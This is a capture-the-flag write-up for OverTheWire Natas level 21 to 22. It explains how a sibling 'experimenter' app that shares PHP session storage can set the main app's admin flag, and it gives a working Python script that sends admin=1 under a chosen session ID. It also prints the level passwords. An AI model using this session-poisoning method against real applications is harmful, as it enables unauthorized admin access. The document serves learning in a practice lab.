# Natas Level 21 to 22

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Natas |
| Level | 21 -> 22 |
| Status | Complete |

## Objective

Use a colocated application to set the main application's session `admin` flag.

## Given Access

User: `natas21`

Password:

```text
BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
```

## Method

The main app reads `$_SESSION["admin"]`. The colocated experimenter app shares session storage and writes every submitted request key into `$_SESSION` when `submit` is present. Send `admin=1` to the experimenter with a chosen `PHPSESSID`, then send that same session ID to the main app.

## Commands

```python
import requests

sid = "sharedsession21"
auth = ("natas21", "BPhv63cKE1lkQl04cE5CuFTzXe15NfiH")

requests.post(
    "http://natas21-experimenter.natas.labs.overthewire.org/",
    auth=auth,
    cookies={"PHPSESSID": sid},
    data={
        "submit": "Update",
        "align": "center",
        "fontsize": "100%",
        "bgcolor": "yellow",
        "admin": "1",
    },
)

r = requests.get(
    "http://natas21.natas.labs.overthewire.org/",
    auth=auth,
    cookies={"PHPSESSID": sid},
)
print(r.text)
```

## Result

Password for `natas22`:

```text
d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz
```

## Lesson

Applications sharing session storage must agree on trust boundaries. A less-restricted sibling app can poison session state for the protected app.

## References

- https://overthewire.org/wargames/natas/
